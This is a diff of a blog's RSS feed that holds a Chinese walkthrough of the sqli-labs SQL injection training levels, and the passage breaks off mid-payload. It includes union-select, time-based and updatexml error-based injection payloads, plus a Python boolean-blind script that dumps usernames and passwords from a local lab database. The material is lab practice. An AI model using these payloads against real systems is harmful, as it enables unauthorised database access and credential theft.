@@ -48,6 +48,15 @@
         <category>等差数列</category>
         <category>深度优先搜索</category>
         <category>广度优先搜索</category>
+        <category>ciscn</category>
+        <category>SSTI</category>
+        <category>arm-linux</category>
+        <category>Tiny6410</category>
+        <category>信息安全</category>
+        <category>linux</category>
+        <category>web</category>
+        <category>javascript</category>
+        <category>XXE</category>
         <item>
             <guid isPermalink="true">http://dpm12345.cn/posts/ca25cf0b/</guid>
             <title>sqli-labs练习</title>
@@ -55,45 +64,83 @@
             <category>CTF</category>
             <category>sql注入</category>
             <pubDate>Fri, 23 Sep 2022 02:48:08 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;less-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-1&#34;&gt;#&lt;/a&gt; less 1&lt;/h1&gt;
-&lt;p&gt;输入 &lt;code&gt;id&lt;/code&gt;  值，测试为字符型注入 (此处注释符不能用 &lt;code&gt;#&lt;/code&gt; ，可用 &lt;code&gt;--+&lt;/code&gt; )&lt;/p&gt;
-&lt;p&gt;然后使用 &lt;code&gt;order by x&lt;/code&gt; ，确认列数，为 3 列&lt;/p&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;less-1&#34;&gt;&lt;a href=&#34;#less-1&#34; class=&#34;headerlink&#34; title=&#34;less 1&#34;&gt;&lt;/a&gt;less 1&lt;/h1&gt;&lt;p&gt;输入&lt;code&gt;id&lt;/code&gt;值，测试为字符型注入(此处注释符不能用&lt;code&gt;#&lt;/code&gt;，可用&lt;code&gt;--+&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;然后使用&lt;code&gt;order by x&lt;/code&gt;，确认列数，为3列&lt;/p&gt;
 &lt;p&gt;然后传入&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;-1&#39; union select 1,2,3--+&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;确定输入位置，分别为 2 和 3&lt;/p&gt;
+&lt;p&gt;确定输入位置，分别为2和3&lt;/p&gt;
 &lt;p&gt;之后正常爆库、表、列&lt;/p&gt;
-&lt;h1 id=&#34;less-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-2&#34;&gt;#&lt;/a&gt; less 2&lt;/h1&gt;
-&lt;p&gt;输入 &lt;code&gt;id&lt;/code&gt; ，测试为整型注入，之后操作同 less 1&lt;/p&gt;
-&lt;h1 id=&#34;less-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-3&#34;&gt;#&lt;/a&gt; less 3&lt;/h1&gt;
-&lt;p&gt;输入 &lt;code&gt;id&lt;/code&gt; ，纯数字，无报错，加上一个单引号，报错&lt;/p&gt;
+&lt;h1 id=&#34;less-2&#34;&gt;&lt;a href=&#34;#less-2&#34; class=&#34;headerlink&#34; title=&#34;less 2&#34;&gt;&lt;/a&gt;less 2&lt;/h1&gt;&lt;p&gt;输入&lt;code&gt;id&lt;/code&gt;，测试为整型注入，之后操作同less 1&lt;/p&gt;
+&lt;h1 id=&#34;less-3&#34;&gt;&lt;a href=&#34;#less-3&#34; class=&#34;headerlink&#34; title=&#34;less 3&#34;&gt;&lt;/a&gt;less 3&lt;/h1&gt;&lt;p&gt;输入&lt;code&gt;id&lt;/code&gt;，纯数字，无报错，加上一个单引号，报错&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;0&#39;&#39;) LIMIT 0,1&#39; at &lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;line 1&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;可判断为字符型注入，且有括号，之后操作如前&lt;/p&gt;
-&lt;h1 id=&#34;less-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-4&#34;&gt;#&lt;/a&gt; less 4&lt;/h1&gt;
-&lt;p&gt;此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可&lt;/p&gt;
-&lt;h1 id=&#34;less-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-5&#34;&gt;#&lt;/a&gt; less 5&lt;/h1&gt;
-&lt;p&gt;此题输入 &lt;code&gt;id=1&lt;/code&gt; ，发现返回的是 &lt;code&gt;You are in...&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;可以推断这题使用 bool 盲注， &lt;code&gt;substr&lt;/code&gt; ， &lt;code&gt;length()&lt;/code&gt; , &lt;code&gt;left&lt;/code&gt;  之类的函数使用，或者可以用时间盲注&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;ascii 可以换 &lt;/code&gt; ord`&lt;/p&gt;
-&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;since        : 2022-08-20 16:05:07&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastAuthor   : zhong&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lastTime     : 2022-08-20 16:31:08&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;blog         : http://dpm12345.cn/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;email        : 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://192.168.47.132:5000/sqli-labs/Less-5/?id=1&#39; and ascii(substr({},{},1))={}--+&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;target &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;#&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;target &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;(select group_concat(schema_name)from information_schema.schemata)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# information_schema,challenges,mysql,performance_schema,security,test&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;database()&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# security&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# emails,referers,uagents,users&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# #id,username,password&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;uagents&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# #id,uagent,ip_address,username&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# target = &#34;(select group_concat(id,0x7e,username,0x7e,password)from security.users)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    target &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;You are in&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# security&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# emails,referers,uagents,users&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;less-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-6&#34;&gt;#&lt;/a&gt; less 6&lt;/h1&gt;
-&lt;p&gt;与 less5 相比，单引号改为双引号&lt;/p&gt;
-&lt;h1 id=&#34;less-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-7&#34;&gt;#&lt;/a&gt; less 7&lt;/h1&gt;
-&lt;p&gt;相比上一个，其 sql 语句应为 &lt;code&gt;where id = ((&#39;$id&#39;))&lt;/code&gt; ，故闭合一个单引号和两个括号，之后和前面脚本一样&lt;/p&gt;
-&lt;h1 id=&#34;less-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-8&#34;&gt;#&lt;/a&gt; less 8&lt;/h1&gt;
-&lt;p&gt;同 less5&lt;/p&gt;
-&lt;h1 id=&#34;less-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-9&#34;&gt;#&lt;/a&gt; less 9&lt;/h1&gt;
-&lt;p&gt;不管什么都显示相同，故采用时间盲注&lt;/p&gt;
-&lt;p&gt;payload： &lt;code&gt;?id=1&#39; and if(ascii(substr({},{},1))={},sleep(1),2)--+&lt;/code&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-10&#34;&gt;#&lt;/a&gt; less 10&lt;/h1&gt;
-&lt;p&gt;第九题改单引号为双引号&lt;/p&gt;
-&lt;h1 id=&#34;less-11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-11&#34;&gt;#&lt;/a&gt; less 11&lt;/h1&gt;
-&lt;p&gt;联合查询&lt;/p&gt;
+&lt;h1 id=&#34;less-4&#34;&gt;&lt;a href=&#34;#less-4&#34; class=&#34;headerlink&#34; title=&#34;less 4&#34;&gt;&lt;/a&gt;less 4&lt;/h1&gt;&lt;p&gt;此题可以判断此种情况为双引号包含和括号包含，闭合后按照以上操作即可&lt;/p&gt;
+&lt;h1 id=&#34;less-5&#34;&gt;&lt;a href=&#34;#less-5&#34; class=&#34;headerlink&#34; title=&#34;less 5&#34;&gt;&lt;/a&gt;less 5&lt;/h1&gt;&lt;p&gt;此题输入&lt;code&gt;id=1&lt;/code&gt;，发现返回的是&lt;code&gt;You are in...&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可以推断这题使用bool盲注，&lt;code&gt;substr&lt;/code&gt;，&lt;code&gt;length()&lt;/code&gt;,&lt;code&gt;left&lt;/code&gt;之类的函数使用，或者可以用时间盲注&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ascii 可以换 &lt;/code&gt;ord`&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;&#39;&#39;&#39;
+Author       : zhong
+since        : 2022-08-20 16:05:07
+LastAuthor   : zhong
+lastTime     : 2022-08-20 16:31:08
+blog         : http://dpm12345.cn/
+email        : 1006975692@qq.com
+&#39;&#39;&#39;
+import requests
+url = &#34;http://192.168.47.132:5000/sqli-labs/Less-5/?id=1&#39; and ascii(substr({},{},1))={}--+&#34;
+target = &#34;&#34;
+result = &#34;#&#34;
+i = 0
+while True:
+    i += 1
+target = &#34;(select group_concat(schema_name)from information_schema.schemata)&#34;
+    # information_schema,challenges,mysql,performance_schema,security,test
+    # target = &#34;database()&#34;
+    # security
+    # target = &#34;(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)&#34;
+    # emails,referers,uagents,users
+    # target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)&#34;
+    # #id,username,password
+    # target = &#34;(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;uagents&#39;)&#34;
+    # #id,uagent,ip_address,username
+    # target = &#34;(select group_concat(id,0x7e,username,0x7e,password)from security.users)&#34;
+    # #1~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~mob!le,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4
+    target = &#34;(select group_concat(uagent,0x7e,ip_address,0x7e,username)from security.uagents)&#34;
+    if i &amp;gt; len(result):
+        break
+    for j in range(33, 128):
+        str = chr(j)
+        print(str)
+        res = requests.get(url.format(target, i, j))
+        if &#34;You are in&#34; in res.text:
+            result += str
+            print(result)
+            break
+print(result)
+
+# security
+# emails,referers,uagents,users
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;less-6&#34;&gt;&lt;a href=&#34;#less-6&#34; class=&#34;headerlink&#34; title=&#34;less 6&#34;&gt;&lt;/a&gt;less 6&lt;/h1&gt;&lt;p&gt;与less5相比，单引号改为双引号&lt;/p&gt;
+&lt;h1 id=&#34;less-7&#34;&gt;&lt;a href=&#34;#less-7&#34; class=&#34;headerlink&#34; title=&#34;less 7&#34;&gt;&lt;/a&gt;less 7&lt;/h1&gt;&lt;p&gt;相比上一个，其sql语句应为&lt;code&gt;where id = ((&#39;$id&#39;))&lt;/code&gt;，故闭合一个单引号和两个括号，之后和前面脚本一样&lt;/p&gt;
+&lt;h1 id=&#34;less-8&#34;&gt;&lt;a href=&#34;#less-8&#34; class=&#34;headerlink&#34; title=&#34;less 8&#34;&gt;&lt;/a&gt;less 8&lt;/h1&gt;&lt;p&gt;同less5&lt;/p&gt;
+&lt;h1 id=&#34;less-9&#34;&gt;&lt;a href=&#34;#less-9&#34; class=&#34;headerlink&#34; title=&#34;less 9&#34;&gt;&lt;/a&gt;less 9&lt;/h1&gt;&lt;p&gt;不管什么都显示相同，故采用时间盲注&lt;/p&gt;
+&lt;p&gt;payload：&lt;code&gt;?id=1&#39; and if(ascii(substr({},{},1))={},sleep(1),2)--+&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-10&#34;&gt;&lt;a href=&#34;#less-10&#34; class=&#34;headerlink&#34; title=&#34;less 10&#34;&gt;&lt;/a&gt;less 10&lt;/h1&gt;&lt;p&gt;第九题改单引号为双引号&lt;/p&gt;
+&lt;h1 id=&#34;less-11&#34;&gt;&lt;a href=&#34;#less-11&#34; class=&#34;headerlink&#34; title=&#34;less 11&#34;&gt;&lt;/a&gt;less 11&lt;/h1&gt;&lt;p&gt;联合查询&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;uname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,database()--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd=admin&amp;amp;uname=&#39; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;security&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;或者使用报错注入&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;uname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; and updatexml(0x7e,concat(0x7e,database()),0x7e)--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;或者&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd=1&amp;amp;uname=1&#39;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span 